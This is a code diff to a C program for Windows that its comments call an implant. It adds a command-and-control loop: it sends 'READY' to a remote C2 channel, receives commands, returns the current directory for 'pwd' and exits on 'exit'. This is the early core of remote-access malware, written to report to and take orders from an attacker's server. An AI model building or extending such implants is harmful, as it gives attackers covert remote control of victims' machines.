@@ -29,18 +29,32 @@ int main() {
     heap = GetProcessHeap();
 
 
-    
+    c2_send("READY", 5); // we need an initial send so we can get a corresponding response
     while (1) {
-        // Recv data TODO: handle timeouts in c2_comm.h with loop
-        c2_send("READY", 5); // we need an initial send so we can get a corresponding response
+        // Recv data
         int n = c2_recv(buffer, 1024);
         if (n <= 0) {
             c2_log("[!] Didn't receive any data!\n");
             continue;
         }
 
-        // Just print data for now
-        c2_log("DATA: %s\n", buffer);
+
+        c2_log("RECV: %s\n", buffer);
+
+
+        // Main logic of implant
+        if (strncmp(buffer, "exit", 4) == 0) {
+            break;
+        }
+        else if (strncmp(buffer, "pwd", 3) == 0) {
+            GetCurrentDirectory(_MAX_PATH, pwd);
+            c2_send(pwd, strlen(pwd));
+        }
+        else {
+            c2_send("[!] Invalid command", 19);
+        }
+
+        
         
 
         // Clear buffer
